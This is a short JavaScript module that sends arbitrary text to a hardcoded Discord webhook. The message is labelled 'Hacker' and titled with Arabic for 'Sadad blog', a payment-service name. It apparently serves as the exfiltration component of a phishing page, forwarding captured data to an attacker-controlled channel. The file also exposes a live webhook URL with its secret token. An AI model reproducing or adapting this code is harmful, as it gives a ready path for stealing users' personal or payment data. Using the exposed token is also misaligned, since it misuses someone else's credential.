import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326101864617345046/i_XS_ZKdefLx3NTBURVA-AErixf3oeIYTGKaVxlfphfCbwljyvxK1fL3OywUHaVjtM_r",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
